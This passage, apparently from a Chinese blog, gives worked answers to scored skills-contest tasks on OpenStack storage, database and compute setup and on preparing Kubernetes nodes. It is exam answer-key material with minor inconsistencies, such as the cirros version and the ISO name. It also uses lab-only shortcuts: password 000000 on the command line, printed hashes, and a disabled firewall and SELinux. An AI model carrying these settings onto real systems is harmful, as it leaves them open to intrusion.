class="line">| source_volid                   | None                                 |</span><br><span class="line">| status                         | available                            |</span><br><span class="line">| updated_at                     | 2023-03-13T19:49:42.000000           |</span><br><span class="line">| user_id                        | 0a22a2d4f3964cfbbbd6474dc92cca01     |</span><br><span class="line">| volume_type                    | lvm                                  |</span><br><span class="line">+--------------------------------+--------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack volume <span class="built_in">type</span> create  lvm</span><br><span class="line">+-------------+--------------------------------------+</span><br><span class="line">| Field       | Value                                |</span><br><span class="line">+-------------+--------------------------------------+</span><br><span class="line">| description | None                                 |</span><br><span class="line">| <span class="built_in">id</span>          | b3872aa9-91df-4b82-a575-9c2e22458ea9 |</span><br><span class="line">| is_public   | True                                 |</span><br><span class="line">| name        | lvm                                  |</span><br><span class="line">+-------------+--------------------------------------+</span><br><span class="line">[root@controller ~]# openstack volume <span class="built_in">type</span> <span class="built_in">set</span>  --property volume_backend_name=LVM lvm</span><br><span class="line">[root@controller ~]# openstack volume create --<span class="built_in">type</span> lvm --size 1 lvm_test</span><br><span class="line">+---------------------+--------------------------------------+</span><br><span class="line">| Field               | Value                                |</span><br><span class="line">+---------------------+--------------------------------------+</span><br><span class="line">| attachments         | []                                   |</span><br><span class="line">| availability_zone   | nova                                 |</span><br><span class="line">| bootable            | <span class="literal">false</span>                                |</span><br><span class="line">| consistencygroup_id | None                                 |</span><br><span class="line">| created_at          | 2023-03-13T19:49:41.000000           |</span><br><span class="line">| description         | None                                 |</span><br><span class="line">| encrypted           | False                                |</span><br><span class="line">| <span class="built_in">id</span>                  | 255ef0a6-1d74-4b82-b930-6ae575aca172 |</span><br><span class="line">| migration_status    | None                                 |</span><br><span class="line">| multiattach         | False                                |</span><br><span class="line">| name                | lvm_test                             |</span><br><span class="line">| properties          |                                      |</span><br><span class="line">| replication_status  | None                                 |</span><br><span class="line">| size                | 1                                    |</span><br><span class="line">| snapshot_id         | None                                 |</span><br><span class="line">| source_volid        | None                                 |</span><br><span class="line">| status              | creating                             |</span><br><span class="line">| <span class="built_in">type</span>                | lvm                                  |</span><br><span class="line">| updated_at          | None                                 |</span><br><span class="line">| user_id             | 0a22a2d4f3964cfbbbd6474dc92cca01     |</span><br><span class="line">+---------------------+--------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/zhaopei123/p/12982526.html">参考链接</a></p>
<h3 id="7-数据库管理"><a href="#7-数据库管理" class="headerlink" title="7.数据库管理"></a>7.数据库管理</h3><p>请使用数据库命令将所有数据库进行备份,备份文件名为 openstack.sql，完成后使用命令</p>
<p>查看文件属性其中文件大小以 mb 显示。</p>
<p>请将 du -h openstack.sql 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# <span class="built_in">du</span> openstack.sql -h</span><br><span class="line">1.6M    openstack.sql</span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# mysqldump -uroot -p000000 --all-databases &gt; openstack.sql</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/weixin_51486343/article/details/113702736">参考文档</a></p>
<h3 id="8-数据库管理"><a href="#8-数据库管理" class="headerlink" title="8.数据库管理"></a>8.数据库管理</h3><p>进入数据库，创建本地用户 examuser，密码为 000000，然后查询 mysql 数据库中的</p>
<p>user 表的 user,host,password 字段。然后赋予这个用户所有数据库的“查询”“删除”“更新”“创</p>
<p>建”的权限。</p>
<p>请将 select user,host,password from user ;命令的返回结果提交到答题框【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; use mysql;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">MariaDB [mysql]&gt;  <span class="keyword">select</span> user,host,password from user;</span><br><span class="line">+----------+------------+-------------------------------------------+</span><br><span class="line">| user     | host       | password                                  |</span><br><span class="line">+----------+------------+-------------------------------------------+</span><br><span class="line">| root     | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| root     | controller | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| root     | 127.0.0.1  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| root     | ::1        | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| keystone | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| keystone | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| glance   | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| glance   | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| nova     | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| nova     | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| neutron  | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| neutron  | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| cinder   | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| cinder   | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| examuser | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">+----------+------------+-------------------------------------------+</span><br><span class="line">15 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# mysql -uroot -p</span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection <span class="built_in">id</span> is 400</span><br><span class="line">Server version: 10.1.20-MariaDB MariaDB Server</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; create user examuser@localhost identified by <span class="string">&#x27;000000&#x27;</span>;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; grant <span class="keyword">select</span>,delete,update,create on *.* to examuser@localhost ;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; flush privileges</span><br><span class="line">    -&gt; ;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="9-存储管理"><a href="#9-存储管理" class="headerlink" title="9.存储管理"></a>9.存储管理</h3><p>请使用 openstack 命令创建一个名为 test 的 cinder 卷，卷大小为 5G。完成后使用 cinder</p>
<p>命令列出卷列表并查看 test 卷的详细信息。</p>
<p>请将 cinder list 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# cinder list</span><br><span class="line">+--------------------------------------+-----------+----------+------+-------------+----------+-------------+</span><br><span class="line">| ID                                   | Status    | Name     | Size | Volume Type | Bootable | Attached to |</span><br><span class="line">+--------------------------------------+-----------+----------+------+-------------+----------+-------------+</span><br><span class="line">| 255ef0a6-1d74-4b82-b930-6ae575aca172 | available | lvm_test | 1    | lvm         | <span class="literal">false</span>    |             |</span><br><span class="line">| 893a1d99-297d-4cf0-8a01-7e637d6ab086 | available | <span class="built_in">test</span>     | 5    | -           | <span class="literal">false</span>    |             |</span><br><span class="line">+--------------------------------------+-----------+----------+------+-------------+----------+-------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack volume create --size 5 <span class="built_in">test</span></span><br><span class="line">+---------------------+--------------------------------------+</span><br><span class="line">| Field               | Value                                |</span><br><span class="line">+---------------------+--------------------------------------+</span><br><span class="line">| attachments         | []                                   |</span><br><span class="line">| availability_zone   | nova                                 |</span><br><span class="line">| bootable            | <span class="literal">false</span>                                |</span><br><span class="line">| consistencygroup_id | None                                 |</span><br><span class="line">| created_at          | 2023-03-13T20:08:38.000000           |</span><br><span class="line">| description         | None                                 |</span><br><span class="line">| encrypted           | False                                |</span><br><span class="line">| <span class="built_in">id</span>                  | 893a1d99-297d-4cf0-8a01-7e637d6ab086 |</span><br><span class="line">| migration_status    | None                                 |</span><br><span class="line">| multiattach         | False                                |</span><br><span class="line">| name                | <span class="built_in">test</span>                                 |</span><br><span class="line">| properties          |                                      |</span><br><span class="line">| replication_status  | None                                 |</span><br><span class="line">| size                | 5                                    |</span><br><span class="line">| snapshot_id         | None                                 |</span><br><span class="line">| source_volid        | None                                 |</span><br><span class="line">| status              | creating                             |</span><br><span class="line">| <span class="built_in">type</span>                | None                                 |</span><br><span class="line">| updated_at          | None                                 |</span><br><span class="line">| user_id             | 0a22a2d4f3964cfbbbd6474dc92cca01     |</span><br><span class="line">+---------------------+--------------------------------------+</span><br><span class="line">[root@controller ~]# cinder show <span class="built_in">test</span></span><br><span class="line">+--------------------------------+--------------------------------------+</span><br><span class="line">| Property                       | Value                                |</span><br><span class="line">+--------------------------------+--------------------------------------+</span><br><span class="line">| attached_servers               | []                                   |</span><br><span class="line">| attachment_ids                 | []                                   |</span><br><span class="line">| availability_zone              | nova                                 |</span><br><span class="line">| bootable                       | <span class="literal">false</span>                                |</span><br><span class="line">| consistencygroup_id            | None                                 |</span><br><span class="line">| created_at                     | 2023-03-13T20:08:38.000000           |</span><br><span class="line">| description                    | None                                 |</span><br><span class="line">| encrypted                      | False                                |</span><br><span class="line">| <span class="built_in">id</span>                             | 893a1d99-297d-4cf0-8a01-7e637d6ab086 |</span><br><span class="line">| metadata                       |                                      |</span><br><span class="line">| migration_status               | None                                 |</span><br><span class="line">| multiattach                    | False                                |</span><br><span class="line">| name                           | <span class="built_in">test</span>                                 |</span><br><span class="line">| os-vol-host-attr:host          | compute@lvm#LVM                      |</span><br><span class="line">| os-vol-mig-status-attr:migstat | None                                 |</span><br><span class="line">| os-vol-mig-status-attr:name_id | None                                 |</span><br><span class="line">| os-vol-tenant-attr:tenant_id   | 1a99aaa6a1024d84a00a779c4d186b44     |</span><br><span class="line">| replication_status             | None                                 |</span><br><span class="line">| size                           | 5                                    |</span><br><span class="line">| snapshot_id                    | None                                 |</span><br><span class="line">| source_volid                   | None                                 |</span><br><span class="line">| status                         | available                            |</span><br><span class="line">| updated_at                     | 2023-03-13T20:08:39.000000           |</span><br><span class="line">| user_id                        | 0a22a2d4f3964cfbbbd6474dc92cca01     |</span><br><span class="line">| volume_type                    | None                                 |</span><br><span class="line">+--------------------------------+--------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="10-存储管理"><a href="#10-存储管理" class="headerlink" title="10.存储管理"></a>10.存储管理</h3><p>为了减缓来自实例的数据访问速度的变慢，OpenStack Block Storage 支持对卷数据复制</p>
<p>带宽的速率限制。请修改 cinder 后端配置文件将卷复制带宽限制为最高 100 MiB&#x2F;s。</p>
<p>请将 cat &#x2F;etc&#x2F;cinder&#x2F;cinder.conf |grep volume_copy 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]#  <span class="built_in">cat</span> /etc/cinder/cinder.conf |grep volume_copy</span><br><span class="line"><span class="comment">#volume_copy_blkio_cgroup_name = cinder-volume-copy</span></span><br><span class="line">volume_copy_bps_limit = 100MiB/s</span><br><span class="line"><span class="comment">#volume_copy_blkio_cgroup_name = cinder-volume-copy</span></span><br><span class="line"><span class="comment">#volume_copy_bps_limit = 0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]#  <span class="built_in">cat</span> /etc/cinder/cinder.conf |grep volume_copy</span><br><span class="line"><span class="comment">#volume_copy_blkio_cgroup_name = cinder-volume-copy</span></span><br><span class="line">volume_copy_bps_limit = 100MiB/s</span><br><span class="line"><span class="comment">#volume_copy_blkio_cgroup_name = cinder-volume-copy</span></span><br><span class="line"><span class="comment">#volume_copy_bps_limit = 0</span></span><br></pre></td></tr></table></figure>

<h3 id="11-存储管理"><a href="#11-存储管理" class="headerlink" title="11.存储管理"></a>11.存储管理</h3><p>在controller节点执行 iaas-install-swift-controller.sh, compute </p>
<p>节点执行iaas-install-swift-compute.sh,在controller和compute节点上会自行安装 swift 服务并完成配</p>
<p>置。创建一个名为 file 的容器。</p>
<p>请将 swift stat file 命令的返回结果提交到答题框【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# swift <span class="built_in">stat</span> file</span><br><span class="line">               Account: AUTH_1a99aaa6a1024d84a00a779c4d186b44</span><br><span class="line">             Container: file</span><br><span class="line">               Objects: 0</span><br><span class="line">                 Bytes: 0</span><br><span class="line">              Read ACL:</span><br><span class="line">             Write ACL:</span><br><span class="line">               Sync To:</span><br><span class="line">              Sync Key:</span><br><span class="line">         Accept-Ranges: bytes</span><br><span class="line">      X-Storage-Policy: Policy-0</span><br><span class="line">         Last-Modified: Mon, 13 Mar 2023 20:21:50 GMT</span><br><span class="line">           X-Timestamp: 1678738909.17978</span><br><span class="line">            X-Trans-Id: tx6951e04bf6c546429752b-00640f85e4</span><br><span class="line">          Content-Type: application/json; charset=utf-8</span><br><span class="line">X-Openstack-Request-Id: tx6951e04bf6c546429752b-00640f85e4</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# iaas-install-swift-controller.sh</span><br><span class="line">[root@compute ~]# iaas-install-swift-compute.sh</span><br><span class="line">[root@controller ~]# swift post file</span><br></pre></td></tr></table></figure>

<h3 id="12-存储管理"><a href="#12-存储管理" class="headerlink" title="12.存储管理"></a>12.存储管理</h3><p>用 swift 命令，把 cirros-0.3.4-x86_64-disk.img 上传到 file 容器中。</p>
<p>请将 swift list file 命令的返回结果提交到答题框【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# swift list file</span><br><span class="line">cirros-0.4.0-x86_64-disk.img</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# swift upload file cirros-0.4.0-x86_64-disk.img</span><br><span class="line">cirros-0.4.0-x86_64-disk.img</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="13-添加控制节点资源到云平台"><a href="#13-添加控制节点资源到云平台" class="headerlink" title="13.添加控制节点资源到云平台"></a>13.添加控制节点资源到云平台</h3><p>修改openrc.sh中的内容，然后在controller节点执行iaas-install-nova-compute.sh，把controller</p>
<p>节点的资源添加到云平台。</p>
<p>请将 openstack compute service list 命令的返回结果提交到答题框【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack compute service list</span><br><span class="line">+----+------------------+------------+----------+---------+-------+----------------------------+</span><br><span class="line">| ID | Binary           | Host       | Zone     | Status  | State | Updated At                 |</span><br><span class="line">+----+------------------+------------+----------+---------+-------+----------------------------+</span><br><span class="line">|  1 | nova-scheduler   | controller | internal | enabled | up    | 2023-03-13T20:29:11.000000 |</span><br><span class="line">|  2 | nova-conductor   | controller | internal | enabled | up    | 2023-03-13T20:29:03.000000 |</span><br><span class="line">|  4 | nova-consoleauth | controller | internal | enabled | up    | 2023-03-13T20:29:07.000000 |</span><br><span class="line">|  7 | nova-compute     | compute    | nova     | enabled | up    | 2023-03-13T20:29:11.000000 |</span><br><span class="line">|  8 | nova-compute     | controller | nova     | enabled | up    | 2023-03-13T20:29:08.000000 |</span><br><span class="line">+----+------------------+------------+----------+---------+-------+----------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改配置文件</span></span><br><span class="line">HOST_IP_NODE=192.168.157.30</span><br><span class="line">OST_NAME_NODE=controller</span><br><span class="line"></span><br><span class="line">[root@controller ~]# iaas-install-nova-compute.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">###可能弹出认证</span></span><br><span class="line"><span class="built_in">yes</span></span><br><span class="line">000000</span><br></pre></td></tr></table></figure>

<h2 id="任务四-OpenStack-架构任务（3-分）"><a href="#任务四-OpenStack-架构任务（3-分）" class="headerlink" title="任务四 OpenStack 架构任务（3 分）"></a>任务四 OpenStack 架构任务（3 分）</h2><p>公司内部拥有一套私有云系统，为了调试该私有云，需要编写一些测试用脚本进行功能</p>
<p>性测试，作为公司私有云维护人员请你完成以下工作。</p>
<p>1.请使用 openstack 命令创建一个浮动 IP 地址，完成后使用 openstack 命令查看该浮动</p>
<p>IP 的 id，请编写一个名为 floating_show.sh 的脚本，该脚本$1 变量为浮动 ip 的 id，对接 neutron</p>
<p>服务端点获取该浮动 IP 的详细信息。脚本使用 curl 向 api 端点传递参数，为了兼容性考虑不</p>
<p>得出现 openstack 命令。</p>
<p>请将 floating_show.sh 中*部分替换为正常内容并提交到答题框【1.5 分】</p>
<p>2.请编写脚本 floating_delete.sh，完成浮动 IP 的删除。设置一个$1 变量，当用户向$1 传递</p>
<p>一个浮动 IP 的 id，即可完成该浮动 IP 的删除。脚本使用 curl 向 api 端点传递参数，为了兼</p>
<p>容性考虑不得出现 openstack 命令。</p>
<p>请将 floating_show.sh 中*部分替换为正常内容并提交到答题框【1.5 分】</p>
<h1 id="B-模块题目：容器的编排与运维"><a href="#B-模块题目：容器的编排与运维" class="headerlink" title="B 模块题目：容器的编排与运维"></a><strong>B</strong> 模块题目：容器的编排与运维</h1><table>
<thead>
<tr>
<th>ip</th>
<th>hostname</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.157.40</td>
<td>master</td>
</tr>
<tr>
<td>192.168.157.41</td>
<td>node1</td>
</tr>
<tr>
<td>192.168.157.42</td>
<td>node2</td>
</tr>
<tr>
<td>192.168.157.43</td>
<td>harbor</td>
</tr>
</tbody></table>
<h2 id="任务-1-容器云平台环境初始化（10-分）"><a href="#任务-1-容器云平台环境初始化（10-分）" class="headerlink" title="任务 1 容器云平台环境初始化（10 分）"></a><strong>任务 1 容器云平台环境初始化（10 分）</strong></h2><h3 id="1-容器云平台的初始化"><a href="#1-容器云平台的初始化" class="headerlink" title="1.容器云平台的初始化"></a>1.容器云平台的初始化</h3><p>master 节点主机名设置为 master、node1 节点主机名设置为 node1、node2 节点主机名设</p>
<p>置为 node2、harbor 节点主机名设置为 harbor,所有节点关闭 swap，并配置 hosts 映射。</p>
<p>请在 master 节点将 free –m 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master ~]# free -m</span><br><span class="line">              total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:           7805         202         127          11        7475        7238</span><br><span class="line">Swap:             0           0           0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改主机名</span></span><br><span class="line"> <span class="comment">## master</span></span><br><span class="line">[root@localhost ~]# hostnamectl  set-hostname master</span><br><span class="line">  <span class="comment">##node1</span></span><br><span class="line">[root@localhost ~]# hostnamectl  set-hostname node1</span><br><span class="line">  <span class="comment">##node2 </span></span><br><span class="line">[root@localhost ~]# hostnamectl  set-hostname node2</span><br><span class="line">  <span class="comment">## harbor</span></span><br><span class="line">[root@localhost ~]# hostnamectl  set-hostname harbor</span><br><span class="line"></span><br><span class="line"><span class="comment">#所有节点</span></span><br><span class="line">[root@master ~]# <span class="built_in">cat</span> /etc/hosts</span><br><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">192.168.157.40 master</span><br><span class="line">192.168.157.41 node1</span><br><span class="line">192.168.157.42 node2</span><br><span class="line">192.168.157.43 harbor</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# swapoff -a</span><br><span class="line">[root@localhost ~]# <span class="built_in">cat</span> /etc/fstab</span><br><span class="line"><span class="comment">#/dev/mapper/centos-swap swap                    swap    defaults        0 0</span></span><br></pre></td></tr></table></figure>

<h3 id="2-Yum-源数据的持久化挂载"><a href="#2-Yum-源数据的持久化挂载" class="headerlink" title="2.Yum 源数据的持久化挂载"></a>2.Yum 源数据的持久化挂载</h3><p>将提供的 CentOS-7-x86_64-DVD-1804.iso 和 bricsskills_cloud_paas.iso 光盘镜像文件移</p>
<p>动到 master 节点 &#x2F;root 目录下，然后在 &#x2F;opt 目录下使用命令创建 centos 目录和 paas 目录，</p>
<p>并将镜像文件 CentOS-7-x86_64-DVD-1804.iso 永久挂载到 centos 目录下，将镜像文件</p>
<p>chinaskills_cloud_paas.iso 永久挂载到 &#x2F;opt&#x2F;paas 目录下。</p>
<p>请在 master 节点将 df -h 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@master ~]# df -h</span><br><span class="line">文件系统                 容量  已用  可用 已用% 挂载点</span><br><span class="line">/dev/mapper/centos-root   44G   14G   31G   32% /</span><br><span class="line">devtmpfs                 3.8G     0  3.8G    0% /dev</span><br><span class="line">tmpfs                    3.9G     0  3.9G    0% /dev/shm</span><br><span class="line">tmpfs                    3.9G   12M  3.8G    1% /run</span><br><span class="line">tmpfs                    3.9G     0  3.9G    0% /sys/fs/cgroup</span><br><span class="line">/dev/sda1               1014M  142M  873M   14% /boot</span><br><span class="line">tmpfs                    781M     0  781M    0% /run/user/0</span><br><span class="line">/dev/loop0               4.2G  4.2G     0  100% /opt/centos</span><br><span class="line">/dev/loop1               8.7G  8.7G     0  100% /opt/paas</span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">##将指定的文件上传到root</span></span><br><span class="line"></span><br><span class="line">[root@master ~]# <span class="built_in">mkdir</span> /opt/centos</span><br><span class="line">[root@master ~]# <span class="built_in">mkdir</span> /opt/paas</span><br><span class="line">[root@master ~]# <span class="built_in">cat</span> /etc/fstab</span><br><span class="line">/root/CentOS-7-x86_64-DVD-1804.iso /opt/centos iso9660 defaults 0 0</span><br><span class="line">/root/bricsskills_cloud_paas.iso /opt/paas iso9660 defaults 0 0</span><br><span class="line">[root@master ~]# mount -a</span><br><span class="line">mount: /dev/loop0 写保护，将以只读方式挂载</span><br><span class="line">mount: /dev/loop1 写保护，将以只读方式挂载</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-Yum-源的编写"><a href="#3-Yum-源的编写" class="headerlink" title="3.Yum 源的编写"></a>3.Yum 源的编写</h3><p>在 master 节点首先将系统自带的 yum 源移动到&#x2F;home 目录，然后为 master 节点配置本</p>
<p>地 yum 源，yum 源文件名为 local.repo。</p>
<p>请将 yum list | grep docker 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master ~]# yum list | grep docker</span><br><span class="line">docker-ce.x86_64                        3:19.03.13-3.el7               paas</span><br><span class="line">docker-ce-cli.x86_64                    1:19.03.13-3.el7               paas</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master ~]# <span class="built_in">mv</span> /etc/yum.repos.d/* /home/</span><br><span class="line">[root@master ~]# <span class="built_in">cat</span> /etc/yum.repos.d/local.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=file:///opt/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[paas]</span><br><span class="line">name=paas</span><br><span class="line">baseurl=file:///opt/paas/kubernetes-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="4-Yum-源的编写"><a href="#4-Yum-源的编写" class="headerlink" title="4.Yum 源的编写"></a>4.Yum 源的编写</h3><p>在 master 节点安装 ftp 服务，将 ftp 共享目录设置为 &#x2F;opt&#x2F;。</p>
<p>请将 curl -l ftp:&#x2F;&#x2F;云主机 IP 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master ~]# curl -l ftp://192.168.157.40</span><br><span class="line">centos</span><br><span class="line">paas</span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#关闭防火墙及安全策略 全部节点</span></span><br><span class="line">[root@master ~]# systemctl stop firewalld &amp;&amp; systemctl <span class="built_in">disable</span> firewalld</span><br><span class="line">Removed symlink /etc/systemd/system/multi-user.target.wants/firewalld.service.</span><br><span class="line">Removed symlink /etc/systemd/system/dbus-org.fedoraproject.FirewallD1.service.</span><br><span class="line">[root@master ~]# setenforce 0</span><br><span class="line">[root@master ~]# <span class="built_in">cat</span> /etc/selinux/config</span><br><span class="line">SELINUX=permissive</span><br><span class="line"></span><br><span class="line">[root@master ~]# yum install -y vsftpd</span><br><span class="line">[root@master ~]# <span class="built_in">cat</span> /etc/vsftpd/vsftpd.conf</span><br><span class="line">anon_root=/opt</span><br><span class="line"></span><br><span class="line">[root@master ~]# systemctl <span class="built_in">enable</span> vsftpd --now</span><br></pre></td></tr></table></figure>

<h3 id="5-Yum-源的编写"><a href="#5-Yum-源的编写" class="headerlink" title="5.Yum 源的编写"></a>5.Yum 源的编写</h3><p>为 node1 节点和 node2 节点分别配置 ftp 源，yum 源文件名称为 ftp.repo，其中 ftp 服务</p>
<p>器地址为 master 节点,配置 ftp 源时不要写 IP 地址，配置之后，两台机器都安装 kubectl 包作</p>
<p>为安装测试。</p>
<p>在 node1 节点请将 yum list | grep kubectl 命令的返回结果提交到答题框。【2 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@node1 ~]# yum list | grep kubectl</span><br><span class="line">kubectl.x86_64                          1.18.1-0                       paas                                                                                  </span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@localhost ~]# <span class="built_in">mv</span> /etc/yum.repos.d/* /home</span><br><span class="line">[root@localhost ~]# <span class="built_in">cat</span> /etc/yum.repos.d/ftp.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=ftp://master/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[paas]</span><br><span class="line">name=paas</span><br><span class="line">baseurl=ftp://master/paas/kubernetes-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-设置时间同步服务器"><a href="#6-设置时间同步服务器" class="headerlink" title="6.设置时间同步服务器"></a>6.设置时间同步服务器</h3><p>在 master 节点上部署 chrony 服务器，允许其它节点同步时间，启动服务并设置为开机</p>
<p>自启动；在其他节点上指定 master 节点为上游 NTP 服务器，重启服务并设为开机自启动。</p>
<p>在 node1 节点将 chronyc sources 命令的返回结果提交到答题框。【2 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@node1 ~]# chronyc sources</span><br><span class="line">210 Number of sources = 1</span><br><span class="line">MS Name/IP address         Stratum Poll Reach LastRx Last sample</span><br><span class="line">===============================================================================</span><br><span class="line">^* master                       11   6    17    36  -1673ns[  -15us] +/-  453us</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master ~]# <span class="built_in">cat</span> /etc/chrony.conf</span><br><span class="line"><span class="comment">#server 0.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 1.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 2.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 3.centos.pool.ntp.org iburst</span></span><br><span class="line">server master iburst</span><br><span class="line">.....</span><br><span class="line"><span class="built_in">local</span> stratum 10</span><br><span class="line">allow 192.168.157.0/24</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#其他节点</span></span><br><span class="line">[root@node1 ~]# <span class="built_in">cat</span> /etc/chrony.conf</span><br><span class="line"><span class="comment">#server 0.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 1.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 2.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 3.centos.pool.ntp.org iburst</span></span><br><span class="line">server master iburst</span><br><span class="line"></span><br><span class="line"><span class="comment">#重启服务(全部节点)</span></span><br><span class="line">[root@node1 ~]# systemctl restart chronyd</span><br><span class="line">[root@node1 ~]# chronyc sources</span><br><span class="line"></span><br></pre></td></tr></table></figure>

